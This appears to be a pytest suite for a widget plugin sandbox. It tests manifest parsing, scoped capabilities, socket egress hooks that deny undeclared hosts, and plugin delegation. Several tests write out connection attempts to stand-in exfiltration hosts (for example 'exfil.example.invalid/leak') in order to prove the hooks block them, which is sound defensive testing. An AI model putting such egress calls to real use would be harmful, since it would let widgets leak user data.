"""Widget capability manifest + runtime enforcement.

Tests cover the parser, the contextvar scope machine, and the
socket egress hook end-to-end. The socket hook is exercised against
``urllib.request.urlopen`` (the entry point most widgets use) so we
prove the cover applies to the full HTTP stack, not just the raw
socket call.
"""

from __future__ import annotations

import socket
import urllib.request
from unittest.mock import Mock

import pytest

from app.capabilities import (
    CapabilityDenied,
    capability_scope,
    install,
    parse,
    uninstall,
)

# -- parse --------------------------------------------------------------


def test_parse_none_returns_undeclared() -> None:
    """Widgets without a ``requires:`` block in plugin.json get an
    undeclared snapshot so the loader doesn't have to special-case
    the legacy path."""
    caps = parse("widget_x", None)
    assert caps.plugin_id == "widget_x"
    assert caps.declared is False
    assert caps.network_hosts == frozenset()


def test_parse_empty_list_is_declared_but_capability_free() -> None:
    """An empty ``requires: []`` is meaningfully different from a
    missing block, the widget author has actively claimed they need
    nothing. Enforcement still blocks any network call."""
    caps = parse("widget_x", [])
    assert caps.declared is True
    assert caps.network_hosts == frozenset()


def test_parse_collects_network_hosts() -> None:
    caps = parse(
        "weather_now",
        ["network:api.open-meteo.com", "network:api.example.invalid"],
    )
    assert caps.network_hosts == frozenset({"api.open-meteo.com", "api.example.invalid"})
    assert caps.declared is True


def test_parse_collects_settings_and_filesystem() -> None:
    caps = parse(
        "ha_battery",
        ["network:ha.local", "settings:plugin/ha_core", "filesystem:write:/tmp/foo"],
    )
    assert "ha.local" in caps.network_hosts
    assert "plugin/ha_core" in caps.settings_scopes
    assert "/tmp/foo" in caps.filesystem_writes


def test_parse_skips_malformed_entries() -> None:
    """Unknown categories + missing colons + non-string entries get
    logged + dropped rather than blowing up the load. Schema
    validation upstream catches structural errors; parse is the
    forgiving last line."""
    caps = parse(
        "widget_x",
        [
            "network:good.example",
            "no_colon_here",
            "unknown_category:foo",
            "network:",  # empty value
            42,  # type: ignore[list-item]  # not a string
        ],
    )
    assert caps.network_hosts == frozenset({"good.example"})


def test_parse_strips_optional_write_prefix() -> None:
    """``filesystem:write:/path`` and ``filesystem:/path`` end up the
    same after parse so the stored representation stays consistent."""
    a = parse("x", ["filesystem:write:/tmp/foo"])
    b = parse("x", ["filesystem:/tmp/foo"])
    assert a.filesystem_writes == b.filesystem_writes


# -- allows_host -------------------------------------------------------


def test_allows_host_undeclared_passes_anything() -> None:
    caps = parse("legacy", None)
    assert caps.allows_host("anything.example") is True


def test_allows_host_empty_declared_blocks_everything() -> None:
    caps = parse("clock", [])
    assert caps.allows_host("anything.example") is False


def test_allows_host_specific_match() -> None:
    caps = parse("weather", ["network:api.open-meteo.com"])
    assert caps.allows_host("api.open-meteo.com") is True
    assert caps.allows_host("api.example.invalid") is False


def test_allows_host_wildcard() -> None:
    caps = parse("anything_goes", ["network:*"])
    assert caps.allows_host("api.example.invalid") is True
    assert caps.allows_any_network is True


# -- contextvar scope --------------------------------------------------


def test_capability_scope_clears_after_exit() -> None:
    from app.capabilities import _active

    assert _active.get() is None
    caps = parse("x", ["network:a.example"])
    with capability_scope(caps):
        assert _active.get() is caps
    assert _active.get() is None


def test_capability_scope_nests_cleanly() -> None:
    """A widget that calls into a sibling plugin (e.g. choices()
    delegation, see [[feedback_per_device_config]] for the pattern)
    enters a nested scope. Both scopes pop in LIFO order so the
    outer widget's caps are restored after the inner returns."""
    from app.capabilities import _active

    outer = parse("widget_a", ["network:a.example"])
    inner = parse("widget_b", ["network:b.example"])

    with capability_scope(outer):
        assert _active.get() is outer
        with capability_scope(inner):
            assert _active.get() is inner
        assert _active.get() is outer
    assert _active.get() is None


def test_capability_scope_with_none_is_host_code() -> None:
    """``capability_scope(None)`` is the explicit "host code, allow
    everything" entry. The hook treats absent contextvar the same
    way; this just confirms None doesn't accidentally trip a deny."""
    from app.capabilities import _active

    with capability_scope(None):
        assert _active.get() is None


# -- socket hook end-to-end --------------------------------------------


@pytest.fixture
def hook_installed() -> _HookFixture:
    """Install the socket hooks for the duration of one test. The
    fixture also catches a real socket call (e.g. via urllib) so we
    don't need network access; the hook fires before the resolve."""
    install()
    yield _HookFixture()
    uninstall()


class _HookFixture:
    """Marker fixture, no state needed. The cleanup is in the
    fixture's teardown."""


def test_hook_blocks_undeclared_host(hook_installed: _HookFixture) -> None:
    caps = parse("weather", ["network:api.open-meteo.com"])
    with capability_scope(caps), pytest.raises(CapabilityDenied) as exc:
        socket.create_connection(("evil.example.invalid", 443))
    assert "weather" in str(exc.value)
    assert "evil.example.invalid" in str(exc.value)


def test_hook_blocks_via_urllib(hook_installed: _HookFixture) -> None:
    """urllib.request.urlopen → http.client → socket.create_connection
    is the canonical widget HTTP path. Make sure our hook fires
    before any DNS lookup so a blocked widget gets a fast deny."""
    caps = parse("weather", ["network:api.open-meteo.com"])
    with capability_scope(caps), pytest.raises(CapabilityDenied):
        urllib.request.urlopen("https://exfil.example.invalid/leak", timeout=1)


def test_hook_allows_declared_host(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A widget that DOES declare its target passes through to the
    original ``create_connection``. We don't want a real network
    round-trip in tests, so stub the underlying call to assert it
    was reached with the expected host."""
    seen: list[tuple[str, int]] = []

    def fake_original(address: tuple[str, int], *args: object, **kwargs: object) -> socket.socket:
        seen.append(address)
        # Return a Mock so we don't leak real socket FDs in the test
        # process (pytest's unraisable-exception detector flags them).
        return Mock(spec=socket.socket)

    monkeypatch.setattr("app.capabilities._original_create_connection", fake_original)
    caps = parse("weather", ["network:api.open-meteo.com"])
    with capability_scope(caps):
        socket.create_connection(("api.open-meteo.com", 443))
    assert seen == [("api.open-meteo.com", 443)]


def test_hook_no_scope_is_host_code(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Host code outside any capability_scope() (e.g. the marketplace
    fetching the catalog index) hits the original socket directly."""
    seen: list[tuple[str, int]] = []

    def fake_original(address: tuple[str, int], *args: object, **kwargs: object) -> socket.socket:
        seen.append(address)
        # Return a Mock so we don't leak real socket FDs in the test
        # process (pytest's unraisable-exception detector flags them).
        return Mock(spec=socket.socket)

    monkeypatch.setattr("app.capabilities._original_create_connection", fake_original)
    socket.create_connection(("anywhere.example", 80))
    assert seen == [("anywhere.example", 80)]


def test_hook_install_is_idempotent() -> None:
    """app_factory may re-run create_app() under the dev reloader.
    install() must be a no-op if the hooks are already in place
    (otherwise we'd stack them and double-fire)."""
    install()
    install()
    install()
    first = socket.create_connection
    install()
    assert socket.create_connection is first
    uninstall()


def test_hook_allows_declared_host_through_real_create_connection(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Regression for the post-DNS double-check bug. The stdlib's
    ``create_connection`` does ``getaddrinfo(host)`` then
    ``sock.connect((ip, port))``, so without the suppression
    contextvar our ``socket.connect`` hook would re-check the IP
    against the hostname allowlist and reject every real request
    (every weather widget for example, since open-meteo's IPs
    aren't in the manifest).

    We mock DNS + the bare ``connect`` syscall so the test doesn't
    need network, but go through the real
    ``_original_create_connection`` so the second hook actually
    fires the way it does in production."""
    monkeypatch.setattr(
        socket,
        "getaddrinfo",
        lambda host, port, *a, **kw: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("188.40.99.226", port)),
        ],
    )
    monkeypatch.setattr("app.capabilities._original_socket_connect", lambda self, address: None)

    caps = parse("weather_now", ["network:api.open-meteo.com"])
    with capability_scope(caps):
        # Pre-fix this raised CapabilityDenied complaining about
        # "188.40.99.226" not being in the manifest.
        sock = socket.create_connection(("api.open-meteo.com", 443))
    sock.close()


def test_hook_blocks_undeclared_host_via_raw_socket_connect(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Raw ``socket.socket().connect((host, port))`` (bypassing
    ``create_connection`` entirely) still gets caught by the second
    hook, since the suppression contextvar is only set inside our
    ``create_connection`` hook."""
    monkeypatch.setattr("app.capabilities._original_socket_connect", lambda self, address: None)
    caps = parse("weather_now", ["network:api.open-meteo.com"])
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        with capability_scope(caps), pytest.raises(CapabilityDenied) as exc:
            sock.connect(("exfil.example.invalid", 443))
        assert "exfil.example.invalid" in str(exc.value)
    finally:
        sock.close()


def test_undeclared_plugin_in_scope_still_allows_network(
    hook_installed: _HookFixture, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Legacy widgets (no ``requires:`` block at all) get an undeclared
    Capabilities snapshot. Inside the scope, ``allows_host`` returns
    True for any host so the existing widget ecosystem keeps working
    without a manifest update."""
    seen: list[tuple[str, int]] = []

    def fake_original(address: tuple[str, int], *args: object, **kwargs: object) -> socket.socket:
        seen.append(address)
        # Return a Mock so we don't leak real socket FDs in the test
        # process (pytest's unraisable-exception detector flags them).
        return Mock(spec=socket.socket)

    monkeypatch.setattr("app.capabilities._original_create_connection", fake_original)
    legacy = parse("very_old_widget", None)
    with capability_scope(legacy):
        socket.create_connection(("any.example", 80))
    assert seen == [("any.example", 80)]


# -- plugin delegation (#244) -------------------------------------------


def _caps(plugin_id: str, requires):
    from app.capabilities import parse

    return parse(plugin_id, requires)


def _with_resolver(mapping):
    """Install a delegate resolver backed by a dict, and tear it down."""
    import contextlib

    from app.capabilities import set_delegate_resolver

    @contextlib.contextmanager
    def _ctx():
        set_delegate_resolver(lambda pid: mapping.get(pid))
        try:
            yield
        finally:
            set_delegate_resolver(None)

    return _ctx()


def test_delegating_widget_inherits_the_delegates_hosts() -> None:
    """The case #244 exists for: a widget that fetches through another
    plugin makes no requests itself, but the delegate's request runs
    inside this widget's scope, so it is this widget that gets denied."""
    core = _caps("calendar_core", ["network:calendar.example"])
    widget = _caps("room_status", ["plugin:calendar_core"])
    with _with_resolver({"calendar_core": core}):
        assert widget.allows_host("calendar.example") is True


def test_delegation_does_not_widen_beyond_the_delegate() -> None:
    core = _caps("calendar_core", ["network:calendar.example"])
    widget = _caps("room_status", ["plugin:calendar_core"])
    with _with_resolver({"calendar_core": core}):
        assert widget.allows_host("evil.example") is False


def test_an_undeclared_delegate_grants_nothing() -> None:
    """Otherwise any widget could name a legacy plugin that has no
    requires block and inherit its implicit unrestricted pass, which
    would make the whole mechanism a bypass."""
    legacy = _caps("calendar_core", None)
    widget = _caps("room_status", ["plugin:calendar_core"])
    assert legacy.declared is False
    with _with_resolver({"calendar_core": legacy}):
        assert widget.allows_host("anything.example") is False


def test_a_missing_delegate_grants_nothing() -> None:
    widget = _caps("room_status", ["plugin:not_installed"])
    with _with_resolver({}):
        assert widget.allows_host("anything.example") is False


def test_delegation_cycle_terminates() -> None:
    """A delegates to B, B back to A. Must answer, not recurse forever."""
    a = _caps("a", ["plugin:b"])
    b = _caps("b", ["plugin:a"])
    with _with_resolver({"a": a, "b": b}):
        assert a.allows_host("anywhere.example") is False


def test_delegation_chain_reaches_a_grandchild() -> None:
    a = _caps("a", ["plugin:b"])
    b = _caps("b", ["plugin:c"])
    c = _caps("c", ["network:deep.example"])
    with _with_resolver({"a": a, "b": b, "c": c}):
        assert a.allows_host("deep.example") is True


def test_self_delegation_is_dropped() -> None:
    widget = _caps("room_status", ["plugin:room_status", "network:x.example"])
    assert widget.delegates == frozenset()
    assert widget.allows_host("x.example") is True


def test_delegation_still_leaves_undeclared_widgets_unenforced() -> None:
    """The implicit pass for widgets with no requires block is what keeps
    every pre-existing install working; delegation must not disturb it."""
    assert _caps("legacy", None).allows_host("anything.example") is True


def test_plugin_category_survives_the_manifest_schema() -> None:
    import json
    from pathlib import Path

    import jsonschema

    root = Path(__file__).resolve().parent.parent
    schema = json.loads((root / "schema" / "plugin.schema.json").read_text(encoding="utf-8"))
    manifest = {
        "tesserae_compat": "1.x",
        "name": "X",
        "version": "0.1.0",
        "kind": "widget",
        "description": "x",
        "supports": {"sizes": ["lg"]},
        "requires": ["plugin:calendar_core"],
    }
    jsonschema.validate(manifest, schema)
